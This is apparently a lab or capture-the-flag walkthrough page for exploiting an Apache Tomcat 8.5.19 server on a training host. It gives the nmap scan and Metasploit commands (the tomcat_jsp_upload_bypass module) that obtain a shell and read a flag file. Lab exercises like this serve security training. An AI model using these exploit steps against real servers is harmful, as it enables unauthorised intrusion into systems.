# Windows: Java Web Server

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 4550–4578. Examples are lab-specific and need verification.

Apache Tomcat is a Java web server that primarily serves as a servlet container, which means it provides an environment for running Java-based web applications. In this lab, we will identify a vulnerability in the Tomcat server and exploit it using a suitable Metasploit module.

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running a vulnerable java web server will be accessible at **demo.ine.local**.

Your task is to fingerprint the application using the tools available on the Kali machine and then exploit the application using the appropriate Metasploit module.

**Objective:** Exploit the application and retrieve the flag!

**Tools: nmap, msf, firefox**

```bash
#port 8080 Apache Tomcat 8.5.19
nmap -Pn -A -T4 demo.ine.local

msfconsole
search apache tomcat
use 42 or
use exploit/multi/http/tomcat_jsp_upload_bypass
set rhosts demo.ine.local
run

#GOT THE SHELL
cd C:\
type flag.txt

```
